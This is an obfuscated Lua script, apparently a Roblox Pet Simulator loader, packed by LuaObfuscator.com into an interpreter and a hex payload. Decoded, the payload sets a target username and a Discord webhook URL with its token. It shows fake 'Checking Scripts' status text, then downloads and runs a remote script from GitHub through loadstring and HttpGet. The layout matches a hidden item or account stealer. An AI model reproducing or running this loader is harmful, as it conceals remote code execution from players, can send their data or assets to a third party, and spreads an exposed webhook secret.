--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.9) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v83=v2(v0(v30,16));if v19 then local v91=v5(v83,v19);v19=nil;return v91;else return v83;end end end);local function v20(v31,v32,v33)if v33 then local v84=(v31/((5 -(1 + 2))^(v32-(2 -1))))%(2^(((v33-(1 -(877 -(282 + 595)))) -(v32-(2 -1))) + (620 -(555 + 64)))) ;return v84-(v84%(932 -(857 + 74))) ;else local v85=(570 -(367 + 201))^(v32-(1638 -(1523 + 114))) ;return (((v31%(v85 + v85))>=v85) and ((834 + 94) -(214 + 713))) or (0 + 0) ;end end local function v21()local v34=(117 -(32 + 85)) -0 ;local v35;while true do if (v34==(1 + 0)) then return v35;end if (v34==(1065 -(68 + 997))) then v35=v1(v16,v18,v18);v18=v18 + (1271 -(226 + 1044)) ;v34=4 -3 ;end end end local function v22()local v36=0;local v37;local v38;while true do if (v36==1) then return (v38 * (57 + 199)) + v37 ;end if (v36==(957 -((1242 -(87 + 263)) + 65))) then v37,v38=v1(v16,v18,v18 + (4 -2) );v18=v18 + ((183 -(67 + 113)) -1) ;v36=1 -0 ;end end end local function v23()local v39=0 + 0 ;local v40;local v41;local v42;local v43;while true do if (v39==((3 -1) -1)) then return (v43 * 16777216) + (v42 * 65536) + (v41 * (189 + 67)) + v40 ;end if (v39==(0 -0)) then v40,v41,v42,v43=v1(v16,v18,v18 + (955 -(802 + 150)) );v18=v18 + ((8 + 2) -6) ;v39=1;end end end local function v24()local v44=v23();local v45=v23();local v46=998 -(915 + (520 -(145 + 293))) ;local v47=(v20(v45,2 -1 ,12 + 8 ) * (2^(41 -(439 -(44 + 386))))) + v44 ;local v48=v20(v45,1208 -(1069 + 118) ,70 -39 );local v49=((v20(v45,32)==(1 -0)) and  -(1 + 0)) or (1 -0) ;if (v48==(0 + 0)) then if (v47==(791 -(368 + 423))) then return v49 * 0 ;else v48=3 -2 ;v46=18 -(10 + 8) ;end elseif (v48==(7874 -5827)) then return ((v47==(442 -(416 + (1512 -(998 + 488))))) and (v49 * ((3 -2)/(0 + 0)))) or (v49 * NaN) ;end return v8(v49,v48-1023 ) * (v46 + (v47/((1 + 1 + 0)^(91 -39)))) ;end local function v25(v50)local v51;if  not v50 then v50=v23();if (v50==(772 -(201 + 571))) then return "";end end v51=v3(v16,v18,(v18 + v50) -1 );v18=v18 + v50 ;local v52={};for v67=1139 -(116 + 1022) , #v51 do v52[v67]=v2(v1(v3(v51,v67,v67)));end return v6(v52);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53=0;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v53~=2) then else v58=nil;v59=nil;v53=3;end if (v53==1) then local v89=0;while true do if (v89~=0) then else v56=nil;v57=nil;v89=1;end if (v89==(1 -0)) then v53=2;break;end end end if (v53==3) then v60=nil;while true do if (v54~=2) then else for v98=1 + 0 ,v23() do local v99=0;local v100;local v101;local v102;while true do if (v99==(560 -(306 + 254))) then v100=0;v101=nil;v99=1 + 0 ;end if (1~=v99) then else v102=nil;while true do if (v100==(1 -0)) then while true do if (v101~=0) then else v102=v21();if (v20(v102,1,1468 -(899 + 568) )~=0) then else local v197=0;local v198;local v199;local v200;local v201;local v202;while true do if (v197~=1) then else v200=nil;v201=nil;v197=2;end if (v197==(0 + 0)) then local v204=0;while true do if (v204~=(2 -1)) then else v197=1;break;end if (v204~=0) then else v198=0;v199=nil;v204=1;end end end if (v197~=2) then else v202=nil;while true do if (v198~=(603 -(268 + 335))) then else local v209=290 -(60 + 230) ;while true do if (v209~=1) then else v198=573 -(426 + 146) ;break;end if (v209~=(0 + 0)) then else v199=0;v200=nil;v209=1;end end end if (v198==1) then local v210=0;local v211;while true do if ((1456 -(282 + 1174))~=v210) then else v211=0;while true do if (v211~=(811 -(569 + 242))) then else local v222=0 -0 ;while true do if (v222==1) then v211=1;break;end if (v222==0) then v201=nil;v202=nil;v222=1;end end end if (v211==(1 + 0)) then v198=1026 -(706 + 318) ;break;end end break;end end end if (v198~=(1253 -(721 + 530))) then else while true do if (v199~=1) then else local v212=1271 -(945 + 326) ;local v213;while true do if (v212~=(0 -0)) then else v213=0;while true do if ((0 + 0)~=v213) then else local v224=0;local v225;while true do if (v224~=0) then else v225=700 -(271 + 429) ;while true do if (v225~=(1 + 0)) then else v213=1501 -(1408 + 92) ;break;end if (v225==0) then v202={v22(),v22(),nil,nil};if (v200==(1288 -(993 + 295))) then local v230=0 + 0 ;local v231;local v232;while true do if (0~=v230) then else v231=0;v232=nil;v230=1172 -(418 + 753) ;end if (v230==1) then while true do if (v231~=0) then else v232=0;while true do if (v232==0) then v202[3]=v22();v202[4]=v22();break;end end break;end end break;end end elseif (v200==1) then v202[2 + 1 ]=v23();elseif (v200==(1 + 1)) then v202[3]=v23() -((1 + 1)^(5 + 11)) ;elseif (v200==(532 -(406 + 123))) then local v239=1769 -(1749 + 20) ;local v240;local v241;while true do if (v239==1) then while true do if (v240==0) then v241=0 + 0 ;while true do if (v241==(1322 -(1249 + 73))) then v202[2 + 1 ]=v23() -(2^16) ;v202[1149 -(466 + 679) ]=v22();break;end end break;end end break;end if (v239==0) then v240=0 -0 ;v241=nil;v239=2 -1 ;end end end v225=1;end end break;end end end if (v213==(1901 -(106 + 1794))) then v199=2;break;end end break;end end end if (3==v199) then if (v20(v201,3,1 + 2 )==(1 + 0)) then v202[4]=v60[v202[4]];end v55[v98]=v202;break;end if (v199==(0 -0)) then local v215=0;local v216;while true do if (v215~=(0 -0)) then else v216=114 -(4 + 110) ;while true do if (v216==(584 -(57 + 527))) then local v226=0;while true do if (v226==(1427 -(41 + 1386))) then v200=v20(v102,105 -(17 + 86) ,3 + 0 );v201=v20(v102,4,13 -7 );v226=2 -1 ;end if (v226==1) then v216=1;break;end end end if (v216==(167 -(122 + 44))) then v199=1;break;end end break;end end end if (v199==(2 -0)) then local v217=0 -0 ;local v218;while true do if (v217~=(0 + 0)) then else v218=0 + 0 ;while true do if (v218~=1) then else v199=3;break;end if (v218==(0 -0)) then local v227=65 -(30 + 35) ;local v228;while true do if (v227~=0) then else v228=0 + 0 ;while true do if (v228==(1258 -(1043 + 214))) then v218=3 -2 ;break;end if ((1212 -(323 + 889))~=v228) then else local v229=0;while true do if (v229~=(2 -1)) then else v228=581 -(361 + 219) ;break;end if (v229~=(320 -(53 + 267))) then else if (v20(v201,1 + 0 ,1)~=(414 -(15 + 398))) then else v202[984 -(18 + 964) ]=v60[v202[7 -5 ]];end if (v20(v201,2,2 + 0 )==(1 + 0)) then v202[3]=v60[v202[853 -(20 + 830) ]];end v229=1 + 0 ;end end end end break;end end end end break;end end end end break;end end break;end end end break;end end break;end if (v100~=0) then else local v157=126 -(116 + 10) ;local v158;while true do if (v157~=0) then else v158=0 + 0 ;while true do if (v158~=1) then else v100=1;break;end if (v158~=(738 -(542 + 196))) then else v101=0;v102=nil;v158=1 -0 ;end end break;end end end end break;end end end for v103=1,v23() do v56[v103-(1 + 0) ]=v28();end return v58;end if (v54~=(1 + 0)) then else local v96=0;while true do if (2==v96) then v54=2;break;end if (v96~=(0 + 0)) then else v59=v23();v60={};v96=1;end if (1==v96) then for v106=1,v59 do local v107=0;local v108;local v109;local v110;local v111;local v112;while true do if ((2 -1)==v107) then v110=nil;v111=nil;v107=2;end if (v107==0) then v108=0 -0 ;v109=nil;v107=1;end if (v107==2) then v112=nil;while true do if (v108~=(1553 -(1126 + 425))) then else while true do if ((405 -(118 + 287))~=v109) then else local v203=0 -0 ;while true do if (v203==0) then local v205=0;while true do if (v205==0) then v110=0;v111=nil;v205=1122 -(118 + 1003) ;end if (v205~=1) then else v203=1;break;end end end if ((2 -1)==v203) then v109=378 -(142 + 235) ;break;end end end if (v109~=(4 -3)) then else v112=nil;while true do if (v110==0) then local v206=0;local v207;while true do if (v206==0) then v207=0 + 0 ;while true do if (v207~=(977 -(553 + 424))) then else local v219=0;while true do if ((0 -0)~=v219) then else local v223=0 + 0 ;while true do if (v223==(0 + 0)) then v111=v21();v112=nil;v223=1;end if (v223~=1) then else v219=1 + 0 ;break;end end end if (v219~=(1 + 0)) then else v207=1 + 0 ;break;end end end if (v207~=1) then else v110=2 -1 ;break;end end break;end end end if (v110~=1) then else if (v111==(2 -1)) then v112=v21()~=0 ;elseif (v111==(4 -2)) then v112=v24();elseif (v111~=3) then else v112=v25();end v60[v106]=v112;break;end end break;end end break;end if (v108~=(0 + 0)) then else v109=0 -0 ;v110=nil;v108=754 -(239 + 514) ;end if (v108==1) then local v194=0;while true do if (v194==(1 + 0)) then v108=2;break;end if (v194==(1329 -(797 + 532))) then v111=nil;v112=nil;v194=1 + 0 ;end end end end break;end end end v58[3]=v21();v96=2;end end end if (v54~=(0 + 0)) then else local v97=0 -0 ;while true do if (v97~=(1202 -(373 + 829))) then else v55={};v56={};v97=732 -(476 + 255) ;end if (v97~=(1132 -(369 + 761))) then else v54=1 + 0 ;break;end if (1==v97) then v57={};v58={v55,v56,nil,v57};v97=2;end end end end break;end if (v53==0) then local v90=0;while true do if ((238 -(64 + 174))==v90) then v54=0;v55=nil;v90=1;end if (v90==(1 + 0)) then v53=1 -0 ;break;end end end end end local function v29(v61,v62,v63)local v64=v61[1];local v65=v61[2];local v66=v61[3];return function(...)local v69=v64;local v70=v65;local v71=v66;local v72=v27;local v73=1;local v74= -1;local v75={};local v76={...};local v77=v12("#",...) -1 ;local v78={};local v79={};for v86=0,v77 do if (v86>=v71) then v75[v86-v71 ]=v76[v86 + 1 ];else v79[v86]=v76[v86 + 1 ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do v81=v69[v73];v82=v81[1];if (v82<=7) then if (v82<=3) then if (v82<=1) then if (v82==0) then if (v81[2]==v79[v81[4]]) then v73=v73 + 1 ;else v73=v81[3];end else local v113=v81[2];local v114=v79[v81[3]];v79[v113 + 1 ]=v114;v79[v113]=v114[v81[4]];end elseif (v82==2) then v73=v81[3];else v63[v81[3]]=v79[v81[2]];end elseif (v82<=5) then if (v82>4) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v63[v81[3]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v81[3];v73=v73 + 1 ;v81=v69[v73];v73=v81[3];else v79[v81[2]]=v63[v81[3]];end elseif (v82>6) then v79[v81[2]][v81[3]]=v81[4];else local v131=v81[2];v79[v131]=v79[v131](v13(v79,v131 + 1 ,v74));end elseif (v82<=11) then if (v82<=9) then if (v82>8) then if (v79[v81[2]]==v81[4]) then v73=v73 + 1 ;else v73=v81[3];end else for v149=v81[2],v81[3] do v79[v149]=nil;end end elseif (v82==10) then local v133=v81[2];local v134,v135=v72(v79[v133](v13(v79,v133 + 1 ,v81[3])));v74=(v135 + v133) -1 ;local v136=0;for v151=v133,v74 do v136=v136 + 1 ;v79[v151]=v134[v136];end else v79[v81[2]]=v81[3];end elseif (v82<=13) then if (v82==12) then v63[v81[3]]=v79[v81[2]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v81[3];v73=v73 + 1 ;v81=v69[v73];v63[v81[3]]=v79[v81[2]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v81[3];v73=v73 + 1 ;v81=v69[v73];v73=v81[3];else do return;end end elseif (v82<=14) then local v143=0;local v144;local v145;local v146;local v147;local v148;while true do if (v143==0) then v144=nil;v145,v146=nil;v147=nil;v148=nil;v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v143=1;end if (v143==2) then v81=v69[v73];v148=v81[2];v147=v79[v81[3]];v79[v148 + 1 ]=v147;v79[v148]=v147[v81[4]];v73=v73 + 1 ;v143=3;end if (v143==4) then v74=(v146 + v148) -1 ;v144=0;for v179=v148,v74 do local v180=0;while true do if (v180==0) then v144=v144 + 1 ;v79[v179]=v145[v144];break;end end end v73=v73 + 1 ;v81=v69[v73];v148=v81[2];v143=5;end if (3==v143) then v81=v69[v73];v79[v81[2]]=v81[3];v73=v73 + 1 ;v81=v69[v73];v148=v81[2];v145,v146=v72(v79[v148](v13(v79,v148 + 1 ,v81[3])));v143=4;end if (1==v143) then v81=v69[v73];v79[v81[2]]=v63[v81[3]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v63[v81[3]];v73=v73 + 1 ;v143=2;end if (v143==6) then v73=v81[3];break;end if (v143==5) then v79[v148]=v79[v148](v13(v79,v148 + 1 ,v74));v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]();v73=v73 + 1 ;v81=v69[v73];v143=6;end end elseif (v82>15) then local v156=0;while true do if (v156==3) then v79[v81[2]]=v81[3];v73=v73 + 1 ;v81=v69[v73];v156=4;end if (v156==0) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v156=1;end if (v156==2) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v156=3;end if (v156==4) then v73=v81[3];break;end if (v156==1) then v79[v81[2]]=v63[v81[3]];v73=v73 + 1 ;v81=v69[v73];v156=2;end end else v79[v81[2]]();end v73=v73 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!173O00028O00027O0040026O00F03F026O00084003023O005F4703053O00546578743203123O0057616974696E6720666F722053637269707403053O00546578743303133O00436865636B696E6720536372697074733O2E03083O00557365726E616D65030B3O006D78726375735O7A03073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O313237323638372O393534353130322O34372F6C575558514934397571586863624C512O30773848664955772D7864776462344B4A6C6A7574335F63586D7A4F4769536871364B3250614150446C5734666F3270352O7103053O00546578743403133O005374617274696E6720536372697074733O2E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C756103103O00437573746F6D5363726970744E616D6503043O00436F656E03053O00546578743103103O00536372697074204C6F616465643O2E00423O00120B3O00014O0008000100013O0026093O0002000100010004023O0002000100120B000100013O00260900010014000100020004023O0014000100120B000200013O0026090002000C000100030004023O000C000100120B000100043O0004023O0014000100260900020008000100010004023O00080001001204000300053O00300500030006000700122O000300053O00302O00030008000900122O000200033O00044O0008000100260900010023000100010004023O0023000100120B000200013O0026090002001B000100030004023O001B000100120B000100033O0004023O0023000100260900020017000100010004023O0017000100120B0003000B3O00120C0003000A3O00122O0003000D3O00122O0003000C3O00122O000200033O00044O001700010026090001002F000100040004023O002F0001001204000200053O00300E0002000E000F00122O000200103O00122O000300113O00202O00030003001200122O000500136O000300056O00023O00024O00020001000100044O0041000100260900010005000100030004023O0005000100120B000200013O00260900020036000100030004023O0036000100120B000100023O0004023O00050001000E2O00010032000100020004023O00320001001204000300053O00300500030014001500122O000300053O00302O00030016001700122O000200033O00044O003200010004023O000500010004023O004100010004023O000200012O000D3O00017O00",v9(),...);end
